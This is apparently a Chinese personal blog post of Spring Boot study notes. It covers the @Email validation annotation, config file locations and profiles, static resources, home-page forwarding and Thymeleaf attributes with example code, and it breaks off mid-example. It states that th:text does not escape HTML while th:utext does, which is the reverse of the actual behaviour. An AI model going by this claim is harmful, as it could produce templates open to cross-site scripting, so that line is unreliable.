class="language-java"><span class="token keyword">package</span> <span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>constraints</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Constraint</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">jakarta<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Payload</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Documented</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Repeatable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Constraint</span><span class="token punctuation">(</span>    validatedBy <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Repeatable</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Email</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">"&#123;jakarta.validation.constraints.Email.message&#125;"</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">groups</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Payload</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">regexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">".*"</span><span class="token punctuation">;</span>    <span class="token class-name">Pattern<span class="token punctuation">.</span>Flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">METHOD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">FIELD</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">CONSTRUCTOR</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">PARAMETER</span><span class="token punctuation">,</span> <span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE_USE</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Documented</span>    <span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">List</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Email</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到对应的处理逻辑，<code>@Email(message=&quot;xxx&quot;)</code>修改message的值可以改变报错返回的信息</p><p>一些内嵌的约束注解：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709012524213.png" alt="image-20240709012524213"></p><hr><h2 id="多环境配置和配置文件位置"><a href="#多环境配置和配置文件位置" class="headerlink" title="多环境配置和配置文件位置"></a>多环境配置和配置文件位置</h2><p>SpringBoot中有四个地方可以存放我们的application.yaml（或.properties）配置文件（最新版貌似有五个），优先级如下：</p><ol><li><p>项目同级目录的config目录下：<code>file:./config/</code></p></li><li><p>项目同级目录：<code>file:./</code></p></li><li><p>resource的config目录下：<code>classpath:./config/</code></p></li><li><p>resource目录下（默认）：<code>classpath:./</code></p></li></ol><p>可以通过指定<code>spring.profiles.active</code>来选择环境，配置文件名为<code>application-xxx.yml(properties)</code>（xxx表示不同环境，如test——测试环境，dev——开发环境），这样子我们只需要在<code>application.yml(properties)</code>中指定<code>spring.profiles.active</code>的值就可以应用对应的配置：</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.profiles.active</span><span class="token punctuation">=</span><span class="token value attr-value">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">profiles</span><span class="token punctuation">:</span>    <span class="token key atrule">active</span><span class="token punctuation">:</span> test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="Web开发"><a href="#Web开发" class="headerlink" title="Web开发"></a>Web开发</h2><h3 id="静态资源导入"><a href="#静态资源导入" class="headerlink" title="静态资源导入"></a>静态资源导入</h3><ul><li>web项目中resource目录下</li><li>项目中的resource&#x2F;resource目录下</li><li>项目中的resource&#x2F;static目录下</li><li>项目中的resource&#x2F;public目录下</li></ul><p>优先级：resource&gt;static（默认）&gt;public</p><p>还有一个webjars的路径：webjars&#x2F;jquery&#x2F;3.5.1&#x2F;jquery.js</p><blockquote><p>tips：IDEA中ctrl+shift+a可以全局搜索</p></blockquote><p>源码分析：参考<a href="https://blog.csdn.net/qq_43466788/article/details/108905644">https://blog.csdn.net/qq_43466788/article/details/108905644</a></p><p>WebMvcAutoConfiguration.class，在其中找到<code>addResourceHandlers</code>方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addResourceHandlers</span><span class="token punctuation">(</span><span class="token class-name">ResourceHandlerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>resourceProperties<span class="token punctuation">.</span><span class="token function">isAddMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Default resource handling disabled"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mvcProperties<span class="token punctuation">.</span><span class="token function">getWebjarsPathPattern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"classpath:/META-INF/resources/webjars/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addResourceHandler</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mvcProperties<span class="token punctuation">.</span><span class="token function">getStaticPathPattern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>registration<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            registration<span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resourceProperties<span class="token punctuation">.</span><span class="token function">getStaticLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletContext <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">ServletContextResource</span> resource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletContextResource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>servletContext<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                registration<span class="token punctuation">.</span><span class="token function">addResourceLocations</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Resource</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>算是比较简单的一个审计代码，有时间了再审（</p><hr><h3 id="首页设置"><a href="#首页设置" class="headerlink" title="首页设置"></a>首页设置</h3><p>把index.html放在templates目录或者static文件夹下，static没有就回去templates找</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709174338230.png" alt="image-20240709174338230"></p><p>使用非index.html的文件作为首页，这里以login.html为例，有两种方法：</p><ul><li><p>自定义一个Controller进行转发：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"forward:login.html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>自定义一个 MVC 配置，并重写<code>addViewControllers</code>方法进行转发</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebMvcConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addViewControllers</span><span class="token punctuation">(</span><span class="token class-name">ViewControllerRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        registry<span class="token punctuation">.</span><span class="token function">addViewController</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span><span class="token string">"forward:login.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>更多方法移步：<a href="https://www.hangge.com/blog/cache/detail_2528.html">https://www.hangge.com/blog/cache/detail_2528.html</a></p><hr><h3 id="Thymeleaf模板引擎"><a href="#Thymeleaf模板引擎" class="headerlink" title="Thymeleaf模板引擎"></a>Thymeleaf模板引擎</h3><p>官方网站：<a href="https://www.thymeleaf.org/index.html">https://www.thymeleaf.org/index.html</a></p><p>参考：<a href="https://blog.csdn.net/u010448530/article/details/113244611">https://blog.csdn.net/u010448530/article/details/113244611</a></p><p>导入依赖：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在application.properties中配置thymleaf：</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.thymeleaf.mode</span> <span class="token punctuation">=</span> <span class="token value attr-value">LEGACYHTML5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（这个配置不是必须的，但是spring.thymeleaf.mode的默认值是HTML5，其实是一个很严格的检查，改为LEGACYHTML5可以得到一个可能更友好亲切的格式要求）</p><p>templates文件夹下创建test.html，然后创建一个IndexController控制器（在templates目录下的所有页面，只能通过controller来跳转，需要thymeleaf模板引擎的支持）</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709220439280.png" alt="image-20240709220439280"></p><h4 id="Thymeleaf语法"><a href="#Thymeleaf语法" class="headerlink" title="Thymeleaf语法"></a>Thymeleaf语法</h4><p>先看一下thymeleaf的源码，在 ThymeleafProperties.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>    prefix <span class="token operator">=</span> <span class="token string">"spring.thymeleaf"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThymeleafProperties</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Charset</span> <span class="token constant">DEFAULT_ENCODING</span><span class="token punctuation">;</span>    <span class="token comment">//规则前缀</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_PREFIX</span> <span class="token operator">=</span> <span class="token string">"classpath:/templates/"</span><span class="token punctuation">;</span>    <span class="token comment">//规则后缀</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_SUFFIX</span> <span class="token operator">=</span> <span class="token string">".html"</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>thymeleaf自动配置了规则前缀和后缀，所以只要我们把html页面放在<code>calsspath:/templates/</code>下，thymeleaf就能自动渲染</p><p>依旧是可以在配置文件中来指定模板：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">thymeleaf</span><span class="token punctuation">:</span>    <span class="token key atrule">prefix</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>/templates/    <span class="token key atrule">check-template-location</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">cache</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">suffix</span><span class="token punctuation">:</span> .html    <span class="token key atrule">encoding</span><span class="token punctuation">:</span> UTF<span class="token punctuation">-</span><span class="token number">8</span>    <span class="token key atrule">content-type</span><span class="token punctuation">:</span> text/html    <span class="token key atrule">mode</span><span class="token punctuation">:</span> HTML5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>prefix：指定模板所在的目录</li><li>check-tempate-location: 检查模板路径是否存在</li><li>cache: 是否缓存，开发模式下设置为false，避免改了模板还要重启服务器，线上设置为true，可以提高性能</li><li>encoding&amp;content-type：与Servlet中设置输出对应属性效果一致</li><li>mode：见官网说明</li></ul><h5 id="th属性"><a href="#th属性" class="headerlink" title="th属性"></a>th属性</h5><blockquote><p>html有的属性，Thymeleaf基本都有，而常用的属性大概有七八个。其中th属性执行的优先级从1~8，数字越低优先级越高</p></blockquote><ol><li><code>th:insert</code>：代码块引入，类似的还有<code>th:replace</code>，<code>th:include</code>，三者的区别较大，若使用不恰当会破坏html结构，常用于公共代码块提取的场景。优先级最高</li><li><code>th:each</code>：遍历循环元素，和<code>th:text</code>或<code>th:value</code>一起使用。注意该属性修饰的标签位置，详细往后看。</li><li><code>th:if</code>：条件判断，类似的还有<code>th:unless</code>，<code>th:switch</code>，<code>th:case</code>。</li><li><code>th:object</code>：声明变量，一般和<code>*&#123;&#125;</code>一起配合使用，达到偷懒的效果。</li><li><code>th:attr</code>：修改任意属性，实际开发中用的较少，因为有丰富的其他th属性帮忙，类似的还有<code>th:attrappend</code>，<code>th:attrprepend</code>。</li><li><code>th:value</code>：设置当前元素的value值，类似修改指定属性的还有<code>th:src</code>，<code>th:href</code>。</li><li><code>th:text</code> ：设置当前元素的文本内容，相同功能的还有<code>th:utext</code>，两者的区别在于<strong>前者不会转义html标签</strong>，后者会。</li><li><code>th:fragment</code>：定义代码块，方便被<code>th:insert</code>引用。优先级最低</li></ol><p>使用thymeleaf属性需要注意的点：</p><ul><li><p>若要使用Thymeleaf语法，首先要声明名称空间： <code>xmlns:th=&quot;http://www.thymeleaf.org&quot;</code></p></li><li><p>设置文本内容<code>th:text</code>，设置input的值<code>th:value</code>，循环输出<code>th:each</code>，条件判断<code>th:if</code>，插入代码块<code>th:insert</code>，定义代码块 <code>th:fragment</code>，声明变量<code>th:object</code></p></li><li><p><code>th:each</code>的用法需要格外注意，打个比方：如果你要循环一个div中的p标签，则<code>th:each</code>属性必须放在p标签上。若你将<code>th:each</code>属性放在div上，则循环的是将整个div。</p></li><li><p>变量表达式中提供了很多的内置方法，该内置方法是用<code>#</code>开头，请不要与<code>#&#123;&#125;</code>消息表达式弄混。</p></li><li><p><code>th:insert</code>，<code>th:replace</code>，<code>th:include</code> 三种插入代码块的效果相似，但区别很大。</p></li></ul><p>例子：</p><ol><li><p>先在controller中绑定数据</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">Model</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">Model</span> model<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 1.绑定一个字符串</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span><span class="token string">"this is a &lt;b>String&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msgUtext"</span><span class="token punctuation">,</span><span class="token string">"this is a &lt;b>String&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2.绑定一个pojo对象</span>        <span class="token class-name">Person</span> per <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"per"</span><span class="token punctuation">,</span>per<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 3.绑定一个list</span>        <span class="token class-name">List</span> list<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>per<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Azusa"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"hina"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"pers"</span><span class="token punctuation">,</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 4.绑定一个map</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Boss"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"boss"</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">,</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在html中使用thymeleaf语法获取数据</p><ul><li><p>声明命名空间</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>th:text</code>和<code>th:value</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token 